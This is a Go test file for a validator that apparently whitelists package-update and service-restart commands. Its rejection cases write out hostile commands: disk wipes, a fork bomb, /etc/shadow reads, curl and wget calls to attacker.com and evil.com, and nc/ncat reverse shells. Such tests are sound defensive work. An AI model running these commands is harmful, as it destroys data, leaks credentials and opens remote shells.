package main

import (
	"testing"
)

func TestValidateCommand_Allowed(t *testing.T) {
	allowed := []string{
		"yum update openssl-1.1.1k -y",
		"yum install nginx -y",
		"dnf update openssl-libs-3.0.7 -y",
		"dnf upgrade curl-7.76.1-26.el9 -y",
		"apt-get install --only-upgrade nginx=1.25.1 -y",
		"apt-get update",
		"apt-get upgrade -y",
		"dpkg -i /tmp/package.deb",
		"rpm -U /tmp/package.rpm",
		"pip install requests==2.31.0",
		"pip3 install urllib3==2.0.7",
		"systemctl restart nginx",
		"systemctl reload sshd",
	}
	for _, cmd := range allowed {
		if err := validateCommand(cmd); err != nil {
			t.Errorf("validateCommand(%q) should be allowed, got: %v", cmd, err)
		}
	}
}

func TestValidateCommand_Rejected_DangerousPatterns(t *testing.T) {
	rejected := []string{
		"rm -rf /",
		"rm -rf /*",
		"mkfs.ext4 /dev/sda",
		"dd if=/dev/zero of=/dev/sda",
		":(){:|:&};:",
	}
	for _, cmd := range rejected {
		if err := validateCommand(cmd); err == nil {
			t.Errorf("validateCommand(%q) should be rejected", cmd)
		}
	}
}

func TestValidateCommand_Rejected_CommandSubstitution(t *testing.T) {
	rejected := []string{
		"yum install $(curl attacker.com/pkg) -y",
		"yum install `curl attacker.com/pkg` -y",
	}
	for _, cmd := range rejected {
		if err := validateCommand(cmd); err == nil {
			t.Errorf("validateCommand(%q) should be rejected (command substitution)", cmd)
		}
	}
}

func TestValidateCommand_Rejected_Redirect(t *testing.T) {
	rejected := []string{
		"echo malicious > /etc/passwd",
		"cat /etc/shadow > /tmp/leak",
		"yum update openssl -y > /tmp/log 2>&1",
	}
	for _, cmd := range rejected {
		if err := validateCommand(cmd); err == nil {
			t.Errorf("validateCommand(%q) should be rejected (redirect)", cmd)
		}
	}
}

func TestValidateCommand_Rejected_CombinedCommands(t *testing.T) {
	rejected := []string{
		"yum update openssl -y && cat /etc/shadow",
		"yum update openssl -y; rm -rf /",
		"yum update openssl -y | curl attacker.com",
		"yum update openssl -y || wget evil.com/backdoor",
	}
	for _, cmd := range rejected {
		if err := validateCommand(cmd); err == nil {
			t.Errorf("validateCommand(%q) should be rejected (combined commands)", cmd)
		}
	}
}

func TestValidateCommand_Rejected_ReverseShell(t *testing.T) {
	rejected := []string{
		"bash -i",
		"nc -e /bin/sh attacker.com 4444",
		"ncat -e /bin/bash attacker.com 4444",
	}
	for _, cmd := range rejected {
		if err := validateCommand(cmd); err == nil {
			t.Errorf("validateCommand(%q) should be rejected (reverse shell)", cmd)
		}
	}
}

func TestValidateCommand_Rejected_NotInWhitelist(t *testing.T) {
	rejected := []string{
		"sed -i 's/old/new/' /etc/config",
		"echo malicious",
		"cat /etc/shadow",
		"tee /etc/crontab",
		"cp /etc/shadow /tmp/",
		"mv /etc/passwd /tmp/",
		"chmod 777 /etc/shadow",
		"chown root:root /tmp/backdoor",
		"wget http://evil.com/backdoor",
		"curl http://evil.com/backdoor",
		"python -c 'import os; os.system(\"id\")'",
	}
	for _, cmd := range rejected {
		if err := validateCommand(cmd); err == nil {
			t.Errorf("validateCommand(%q) should be rejected (not in whitelist)", cmd)
		}
	}
}

func TestValidateCommand_Rejected_TooLong(t *testing.T) {
	long := "yum update " + string(make([]byte, 4100))
	if err := validateCommand(long); err == nil {
		t.Error("validateCommand should reject commands > 4096 chars")
	}
}

func TestContainsShellOperator(t *testing.T) {
	tests := []struct {
		cmd      string
		expected bool
	}{
		{"yum update openssl -y", false},
		{"apt-get install nginx=1.25.1 -y", false},
		{"yum update openssl -y && echo done", true},
		{"cmd1 || cmd2", true},
		{"cmd1; cmd2", true},
		{"cmd1 | cmd2", true},
		// 引号内的操作符应被忽略（但这些命令仍然会被白名单拦截）
		{`yum install "pkg-1.0&2" -y`, false},
		{`yum install 'pkg;special' -y`, false},
	}
	for _, tt := range tests {
		result := containsShellOperator(tt.cmd)
		if result != tt.expected {
			t.Errorf("containsShellOperator(%q) = %v, want %v", tt.cmd, result, tt.expected)
		}
	}
}

func TestMatchesAllowedPrefix(t *testing.T) {
	tests := []struct {
		cmd      string
		expected bool
	}{
		{"yum update openssl -y", true},
		{"YUM UPDATE openssl -y", true},
		{"dnf install nginx -y", true},
		{"apt-get install nginx=1.0 -y", true},
		{"systemctl restart nginx", true},
		{"systemctl reload sshd", true},
		{"systemctl stop nginx", false},  // stop 已移除
		{"systemctl start nginx", false}, // start 已移除
		{"sed -i 's/a/b/' /etc/foo", false},
		{"echo hello", false},
		{"cat /etc/passwd", false},
		{"rm -rf /", false},
	}
	for _, tt := range tests {
		result := matchesAllowedPrefix(tt.cmd)
		if result != tt.expected {
			t.Errorf("matchesAllowedPrefix(%q) = %v, want %v", tt.cmd, result, tt.expected)
		}
	}
}
